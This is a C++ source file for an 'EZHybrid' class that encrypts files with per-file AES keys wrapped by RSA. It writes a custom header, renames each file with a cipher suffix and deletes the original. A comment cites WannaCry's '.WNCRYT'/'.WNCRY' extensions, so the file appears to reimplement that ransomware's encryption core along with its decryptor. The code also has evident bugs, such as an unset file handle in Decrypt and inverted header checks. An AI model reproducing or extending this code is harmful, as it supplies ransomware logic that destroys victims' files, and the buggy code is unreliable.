#include "../Common/common.h"

#include "EZHybrid.h"

static BOOL GenRandom(
	PUCHAR pbBuffer,
	ULONG cbBuffer
)
{
	NTSTATUS status = BCryptGenRandom(
		NULL,
		pbBuffer,
		cbBuffer,
		BCRYPT_USE_SYSTEM_PREFERRED_RNG
	);

	if (!NT_SUCCESS(status))
	{
		DEBUG("BCryptGenRandom returns 0x%x\n", status);
		return FALSE;
	}

	return TRUE;
}

EZHybrid::EZHybrid()
{
	m_pEncRSA = NULL;
	m_pDecRSA = NULL;

	m_InBuffer = (PUCHAR)HeapAlloc(
		GetProcessHeap(),
		0,
		EZH_IOBUFFERSIZE
	);

	m_OutBuffer = (PUCHAR)HeapAlloc(
		GetProcessHeap(),
		0,
		EZH_IOBUFFERSIZE
	);

	return;
}

EZHybrid::~EZHybrid()
{
	if (m_pEncRSA)
	{
		delete m_pEncRSA;
		m_pEncRSA = NULL;
	}

	if (m_pDecRSA)
	{
		delete m_pDecRSA;
		m_pDecRSA = NULL;
	}

	if (m_InBuffer)
	{
		HeapFree(GetProcessHeap(), 0, m_InBuffer);
		m_InBuffer = NULL;
	}

	if (m_OutBuffer)
	{
		HeapFree(GetProcessHeap(), 0, m_OutBuffer);
		m_OutBuffer = NULL;
	}

	return;
}

BOOL EZHybrid::GenKey()
{
	if (!m_pEncRSA)
	{
		m_pEncRSA = new EZRSA();
		if (!m_pEncRSA)
		{
			return FALSE;
		}
	}

	return m_pEncRSA->GenKey();
}

BOOL EZHybrid::ImportPublicKey(
	PUCHAR pbPublicBlob,
	ULONG cbPublicBlob
)
{
	if (!m_pEncRSA)
	{
		m_pEncRSA = new EZRSA();
		if (!m_pEncRSA)
		{
			return FALSE;
		}
	}

	BOOL bResult = m_pEncRSA->Import(
		BCRYPT_RSAPUBLIC_BLOB,
		pbPublicBlob,
		cbPublicBlob
	);

	return bResult;
}

BOOL EZHybrid::ImportPrivateKey(
	PUCHAR pbPrivateBlob,
	ULONG cbPrivateBlob
)
{
	if (!m_pDecRSA)
	{
		m_pDecRSA = new EZRSA();
		if (!m_pDecRSA)
		{
			return FALSE;
		}
	}

	BOOL bResult = m_pDecRSA->Import(
		BCRYPT_RSAPRIVATE_BLOB,
		pbPrivateBlob,
		cbPrivateBlob
	);

	return bResult;
}

BOOL EZHybrid::ImportPublicKey(
	LPCTSTR lpPublicBlobFile
)
{
	if (!m_pEncRSA)
	{
		m_pEncRSA = new EZRSA();
		if (!m_pEncRSA)
		{
			return FALSE;
		}
	}

	BOOL bResult = m_pEncRSA->Import(
		BCRYPT_RSAPUBLIC_BLOB,
		lpPublicBlobFile
	);

	return bResult;
}

BOOL EZHybrid::ImportPrivateKey(
	LPCTSTR lpPrivateBlobFile
)
{
	if (!m_pDecRSA)
	{
		m_pDecRSA = new EZRSA();
		if (!m_pDecRSA)
		{
			return FALSE;
		}
	}

	BOOL bResult = m_pDecRSA->Import(
		BCRYPT_RSAPRIVATE_BLOB,
		lpPrivateBlobFile
	);

	DEBUG("ImportPrivateKey: return %d\n", bResult);

	return bResult;
}

BOOL EZHybrid::Encrypt(
	LPCTSTR pFileName
)
{
	UCHAR abMagic[8];
	ULONG cbCipherKey;
	UCHAR abCipherKey[0x200];
	ULONG EncryptOP = EZH_ENCRYPT;
	ULONG nCryptType = 0;
	LARGE_INTEGER ddwFileSize;

	PEZAES pAES = NULL;
	UCHAR abKey[16];
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hWrite = INVALID_HANDLE_VALUE;

	ULONG cbRead = NULL, cbWrite = NULL;

	FILETIME CreationTime;
	FILETIME LastAccessTime;
	FILETIME LastWriteTime;

	BOOL bResult = TRUE;

	PUCHAR pbInBlock = m_InBuffer;
	ULONG cbInBlock = 0;
	PUCHAR pbOutBlock = m_OutBuffer;
	ULONG cbOutBlock = 0;

	TCHAR pTempFile[MAX_PATH];
	TCHAR pTarget[MAX_PATH];

	if (!m_pEncRSA)
	{
		DEBUG("m_pEncRSA is NULL, please call ImportPublicKey()\n");
		return FALSE;
	}

	DEBUG("Encrypt %s\n", pFileName);
	_tcscpy_s(pTarget, MAX_PATH, pFileName);

	LPTSTR pSuffix = (LPTSTR)_tcsrchr(pTarget, _T('.'));
	if (!pSuffix)
	{
		_tcscat_s(pTarget, MAX_PATH, EZH_SUFFIX_CIPHER);
	}
	else
	{
		if (!_tcsicmp(pSuffix, EZH_SUFFIX_CIPHER) || !_tcsicmp(pSuffix, EZH_SUFFIX_TEMP))
		{
			return TRUE;
		}
		else
		{
			_tcscat_s(pSuffix, MAX_PATH - _tcslen(pFileName), EZH_SUFFIX_CIPHER);
		}
	}

	if (!(hFile = CreateFile(
		pFileName,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)))
	{
		DEBUG("Open %s for read error\n", pFileName);
		return FALSE;
	}

	DEBUG("Open %s fpr read\n", pFileName);
	ddwFileSize.QuadPart = 0;
	GetFileTime(
		hFile,
		&CreationTime,
		&LastAccessTime,
		&LastWriteTime
	);

	if (!ReadFile(
		hFile,
		abMagic,
		sizeof(abMagic),
		&cbRead,
		0
	) &&
		!memcmp(abMagic, EZH_MAGIC, sizeof(abMagic)) &&
		ReadFile(
			hFile,
			&cbCipherKey,
			sizeof(cbCipherKey),
			&cbRead,
			0
		) &&

		cbCipherKey <= sizeof(abCipherKey) &&
		cbCipherKey == 0x100 &&
		ReadFile(
			hFile,
			abCipherKey,
			0x100,
			&cbRead,
			0
		) &&
		ReadFile(
			hFile,
			&nCryptType,
			sizeof(nCryptType),
			&cbRead,
			0
		) &&
		ReadFile(
			hFile,
			&ddwFileSize.QuadPart,
			sizeof(ddwFileSize),
			&cbRead,
			0
		) &&
		nCryptType == EncryptOP)
	{
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
		DEBUG("exit\n");

		return TRUE;
	}

	GetFileSizeEx(hFile, &ddwFileSize);
	SetFilePointer(hFile, 0, 0, FILE_BEGIN);

	_stprintf_s(pTempFile, MAX_PATH, _T("%s%s"), pFileName, EZH_SUFFIX_TEMP);

	if (INVALID_HANDLE_VALUE == (hWrite = CreateFile(
		pTempFile,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)))
	{
		DEBUG("Open temp file %s error\n", pTempFile);
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;

		DEBUG("Open for write error\n", pTempFile);
		return FALSE;
	}

	GenRandom(abKey, sizeof(abKey));

	//Encrypt 16 bytes AES key
	m_pEncRSA->Encrypt(
		abKey,
		sizeof(abKey),
		abCipherKey,
		sizeof(abCipherKey),
		&cbCipherKey
	);

	pAES = new EZAES();
	pAES->GenKey(abKey, sizeof(abKey));

	if (!WriteFile(hWrite,
		EZH_MAGIC, 8, &cbWrite, 0) ||

		!WriteFile(hWrite,
			&cbCipherKey, sizeof(cbCipherKey), &cbWrite, 0) ||

		!WriteFile(hWrite,
			abCipherKey, cbCipherKey, &cbWrite, 0) ||

		!WriteFile(hWrite,
			&EncryptOP, sizeof(EncryptOP), &cbWrite, 0) ||

		!WriteFile(hWrite,
			&ddwFileSize.QuadPart, sizeof(ddwFileSize.QuadPart), &cbWrite, 0))
	{
		DEBUG("Write header error %s\n", pTempFile);
		goto Error_Exit;
	}

	ULONG cbData;
	LARGE_INTEGER cbSize;
	cbSize.QuadPart = ddwFileSize.QuadPart;
	while (cbSize.QuadPart > 0)
	{
		cbInBlock = cbSize.QuadPart < EZH_IOBUFFERSIZE ? cbSize.LowPart : EZH_IOBUFFERSIZE;

		if (!ReadFile(
			hFile,
			pbInBlock,
			cbInBlock,
			&cbRead,
			0
		) || cbRead != cbInBlock)
		{
			DEBUG("Read block error %s\n", pFileName);
			goto Error_Exit;
		}

		cbOutBlock = ((cbInBlock + 15) >> 4) << 4;

		//Padding
		if (cbOutBlock > cbInBlock)
		{
			ZeroMemory(pbInBlock + cbInBlock, cbOutBlock - cbInBlock);
		}

		pAES->Encrypt(
			pbInBlock,
			cbInBlock,
			pbOutBlock,
			EZH_IOBUFFERSIZE,
			&cbData
		);

		if (!WriteFile(
			hWrite,
			pbOutBlock,
			cbOutBlock,
			&cbWrite,
			0
		) || cbWrite != cbOutBlock)
		{
			DEBUG("Write block error %s\n", pTempFile);
			goto Error_Exit;
		}

		cbSize.QuadPart -= cbInBlock;
	}

	//set time
	SetFileTime(
		hFile,
		&CreationTime,
		&LastAccessTime,
		&LastWriteTime
	);

	//close handle
	CloseHandle(hWrite);
	CloseHandle(hFile);
	hWrite = INVALID_HANDLE_VALUE;
	hFile = INVALID_HANDLE_VALUE;

	bResult = MoveFile(pTempFile, pTarget); //Rename file from .WNCRYT to .WNCRY

	if (bResult)
	{
		SetFileAttributes(pTarget, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(pFileName);
	}
	else
	{
		DeleteFile(pTempFile);
	}

	if (pAES)
	{
		delete pAES;
		pAES = NULL;
	}

	return bResult;

Error_Exit:
	CloseHandle(hWrite);
	CloseHandle(hFile);
	hWrite = INVALID_HANDLE_VALUE;
	hFile = INVALID_HANDLE_VALUE;

	if (pAES)
	{
		delete pAES;
		pAES = NULL;
	}

	return FALSE;
}

BOOL EZHybrid::Decrypt(LPCTSTR pFileName)
{
	TCHAR pTempFile[MAX_PATH];
	TCHAR pTarget[MAX_PATH];

	UCHAR abMagic[8];
	ULONG cbCipherKey;
	UCHAR abCipherKey[0x200];
	ULONG nCryptType = 0;
	LARGE_INTEGER ddwFileSize;

	UCHAR abKey[0x200];
	ULONG cbKey;
	PEZAES pAES = NULL;
	
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hWrite = INVALID_HANDLE_VALUE;
	ULONG cbRead, cbWrite;

	FILETIME CreationTime;
	FILETIME LastAccessTime;
	FILETIME LastWriteTime;

	PUCHAR pbInBlock = m_InBuffer;
	ULONG cbInBlock = 0;
	PUCHAR pbOutBlock = m_OutBuffer;
	ULONG cbOutBlock = 0;

	BOOL bResult = TRUE;
	if (!m_pDecRSA)
	{
		DEBUG("m_DecRSA is NULL, please call ImportPrivateKey()\n");
		return FALSE;
	}

	DEBUG("Decrypt %s\n", pFileName);
	if (INVALID_HANDLE_VALUE == CreateFile(
		pFileName,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	))
	{
		return FALSE;
	}

	GetFileTime(
		hFile,
		&CreationTime,
		&LastAccessTime,
		&LastWriteTime
	);

	//Read header
	if (ReadFile(hFile,
		abMagic, sizeof(abMagic), &cbRead, 0) &&

		!memcmp(abMagic, EZH_MAGIC, sizeof(abMagic)) &&

		ReadFile(hFile,
			&cbCipherKey, sizeof(cbCipherKey), &cbRead, 0) &&

		cbCipherKey <= sizeof(abCipherKey) &&
		cbCipherKey == 0x100 &&

		ReadFile(hFile,
			abCipherKey, 0x100, &cbRead, 0) &&

		ReadFile(hFile,
			&nCryptType, sizeof(nCryptType), &cbRead, 0) &&

		EZH_ENCRYPT == nCryptType &&

		ReadFile(hFile,
			&ddwFileSize.QuadPart, sizeof(ddwFileSize.QuadPart), &cbRead, 0))
	{
		_tcscpy_s(pTarget, MAX_PATH, pTempFile);
		LPTSTR pSuffix = _tcsrchr(pTarget, _T('.'));

		if (pSuffix)
		{
			if (!_tcsicmp(pSuffix, EZH_SUFFIX_CIPHER))
			{
				*pSuffix = _T('\0');
			}
			else
			{
				_stprintf_s(pTarget, MAX_PATH, _T("%s%s"), pFileName, _T(".decoded"));
			}
		}

		_stprintf_s(pTempFile, MAX_PATH, _T("%s%s"), pFileName, EZH_SUFFIX_TEMP);

		if (INVALID_HANDLE_VALUE == (hWrite = CreateFile(
			pTempFile,
			GENERIC_WRITE,
			FILE_SHARE_READ,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		)))
		{
			DEBUG("CreateFile %s failed\n", pTarget);
			goto Error_Exit;
		}

		LARGE_INTEGER cbSize;

		pAES = new EZAES();

		m_pDecRSA->Decrypt(
			abCipherKey,
			cbCipherKey,
			abKey,
			sizeof(abKey),
			&cbKey
		);

		if (cbKey != 16)
		{
			_tprintf(_T("error: cbKey=%d not 16\n"), cbKey);
			goto Error_Exit;
		}

		pAES->GenKey(abKey, cbKey);

		//todo: Page 11-33, line 474 from textbook.
		ULONG cbData;
		for (cbSize.QuadPart = ddwFileSize.QuadPart; cbSize.QuadPart > 0; cbSize.QuadPart -= cbOutBlock)
		{
			cbOutBlock = cbSize.QuadPart < EZH_IOBUFFERSIZE ? cbSize.LowPart : EZH_IOBUFFERSIZE;

			cbInBlock = ((cbOutBlock + 15) >> 4 << 4);

			if (!ReadFile(
				hFile,
				pbInBlock,
				cbInBlock,
				&cbRead,
				0
			) || cbRead != cbInBlock)
			{
				goto Error_Exit;
			}

			pAES->Decrypt(
				pbInBlock,
				cbInBlock,
				pbOutBlock,
				cbOutBlock,
				&cbData
			);

			if (!WriteFile(
				hWrite,
				pbOutBlock,
				cbOutBlock,
				&cbWrite,
				0
			) || cbWrite != cbOutBlock)
			{
				DEBUG("Write block error %s\n", pTarget); //Actually, it is pTempFile, but the final result that we want is pTarget.
				goto Error_Exit;
			}
		}

		SetFileTime(
			hWrite,
			&CreationTime,
			&LastAccessTime,
			&LastWriteTime
		);

		CloseHandle(hWrite);
		CloseHandle(hFile);
		hWrite = INVALID_HANDLE_VALUE;
		hFile = INVALID_HANDLE_VALUE;

		bResult = MoveFileEx(
			pTempFile,
			pTarget,
			MOVEFILE_REPLACE_EXISTING
		);

		if (bResult)
		{
			DeleteFile(pFileName);
		}

		if (pAES)
		{
			delete pAES;
			pAES = NULL;
		}

		return bResult;

	Error_Exit:
		CloseHandle(hWrite);
		CloseHandle(hFile);
		hWrite = INVALID_HANDLE_VALUE;
		hFile = INVALID_HANDLE_VALUE;

		if (pAES)
		{
			delete pAES;
			pAES = NULL;
		}

		return FALSE;
	}
	else
	{
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
		return TRUE;
	}
}